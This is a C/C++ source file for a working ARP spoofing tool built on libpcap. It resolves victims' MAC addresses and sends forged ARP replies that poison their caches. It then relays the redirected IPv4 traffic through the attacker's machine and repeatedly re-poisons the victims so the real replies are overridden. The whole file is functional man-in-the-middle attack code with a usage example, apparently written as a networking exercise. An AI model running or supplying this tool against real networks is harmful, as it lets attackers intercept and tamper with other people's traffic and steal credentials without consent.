#include <arpa/inet.h>
#include <libnet.h>
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include "eth.h"
#include "arp.h"
#include "ipv4.h"
#include "packet.h"
#include "mac.h"

using namespace std;


struct SESSION {
	MAC sender_mac, target_mac;
	uint32_t sender_ip, target_ip;
};

int size;

// get my mac address from ioctl
void getMacAddress(char *iface, uint8_t *my_mac) {
	int fd;
	struct ifreq ifr;
	char *mac;

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy((char*)ifr.ifr_name, (const char*)iface, IFNAMSIZ-1);

	ioctl(fd, SIOCGIFHWADDR, &ifr);

	close(fd);

	mac = (char *)ifr.ifr_hwaddr.sa_data;
	memcpy(my_mac, mac, 6);
}

// get my ip address from ioctl
void getIpAddress(char *iface, uint32_t &my_ip) {
	int fd;
	struct ifreq ifr;
	uint32_t ip;

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy((char*)ifr.ifr_name, (const char*)iface, IFNAMSIZ-1);

	ioctl(fd, SIOCGIFADDR, &ifr);

	close(fd);

	ip = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr;
	my_ip = ip;
}


void find_mac(pcap_t *handle, MAC *mac, uint32_t *ip, MAC my_mac, uint32_t my_ip) {
	for (int i=0; i<size; i++) {
		PACKET request_packet = PACKET(mac[i], ip[i], my_mac, my_ip);
	
		int count = 0;
		while (true) {
			if (count % 100 == 0) {
				pcap_sendpacket(handle, (uint8_t*)(&request_packet), sizeof(request_packet));
			}
			struct pcap_pkthdr *header;
			const u_char* packet;
			int res = pcap_next_ex(handle, &header, &packet);
			if (res == 0) continue;
			if (res == -1 || res == -2) break;

			PACKET *p = (struct PACKET*)packet;
			if (p->is_arp_reply() &&
				p->is_sender_ip(ip[i]) &&
				p->is_target_ip(my_ip) &&
				p->is_target_mac(my_mac)) {
				mac[i] = p->get_sender_mac();
				break;
			}
			count++;
		}
	}
}


void spoofing(pcap_t *handle, MAC *sender_mac, uint32_t *sender_ip, MAC *target_mac, uint32_t *target_ip, MAC my_mac, uint32_t my_ip) {
	// send arp
	for (int i=0; i<size; i++) {
		PACKET p = PACKET(sender_mac[i], my_mac, my_mac, target_ip[i], sender_mac[i], sender_ip[i]);
		pcap_sendpacket(handle, (uint8_t*)(&p), sizeof(p));
	}

	// spoofing
	while (true) {
		struct pcap_pkthdr *header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) break;
	
		PACKET *p = (struct PACKET*)packet;
		for (int i=0; i<size; i++) {
			if (p->is_smac(sender_mac[i])) {
				// redirection
				if (p->is_ipv4() && p->is_dmac(my_mac)) {
					// change ethernet mac address
					memcpy((void*)packet, (uint8_t*)&target_mac[i], 6);
					memcpy((void*)(packet+6), (uint8_t*)&my_mac, 6);
					
					pcap_sendpacket(handle, packet, header->caplen);
				}
				// send arp
				else if (p->is_arp_request()) {
					if (p->is_target_ip(target_ip[i])) {
						PACKET p = PACKET(sender_mac[i], my_mac, my_mac, target_ip[i], sender_mac[i], sender_ip[i]);
						// If real target reply, our reply can be ignored.
						// So send 3 times!
						for (int i=0; i<3; i++)
							pcap_sendpacket(handle, (uint8_t*)(&p), sizeof(p));
					}
				}
			}
		}
	}
}

void usage() {
	printf("[-] syntax: ./arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("[-] ex) ./arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int main(int argc, char *argv[]) {
	if (argc < 4 || argc%2 != 0) {
		usage();
		return -1;
	}	
	
	size = (argc - 2)/2;
	char* iface = argv[1];

	char errbuf[PCAP_ERRBUF_SIZE];
	int packet_len;

	uint32_t my_ip;
	uint8_t mac[6];

	getIpAddress(iface, my_ip);
	getMacAddress(iface, mac);
	MAC my_mac = MAC(mac);

	uint32_t *sender_ip = new uint32_t[size];
	uint32_t *target_ip = new uint32_t[size];
	MAC *sender_mac = new MAC[size];
	MAC *target_mac = new MAC[size];
	

	for (int i=0; i<size; i++) {
		sender_ip[i] = inet_addr(argv[2*i + 2]);
		target_ip[i] = inet_addr(argv[2*i + 3]);
	}
	
	pcap_t *handle = pcap_open_live(iface, BUFSIZ, 1, 1, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s - %s\n", iface, errbuf);
		return -1;
	}	

	find_mac(handle, sender_mac, sender_ip, my_mac, my_ip);
	printf("[+] Find senders' mac\n");
	find_mac(handle, target_mac, target_ip, my_mac, my_ip);
	printf("[+] Find targets' mac\n");

	printf("[+] Start ARP SPOOFING\n");
	spoofing(handle, sender_mac, sender_ip, target_mac, target_ip, my_mac, my_ip);
	
	delete sender_ip;
	delete sender_mac;
	delete target_ip;
	delete target_mac;
}
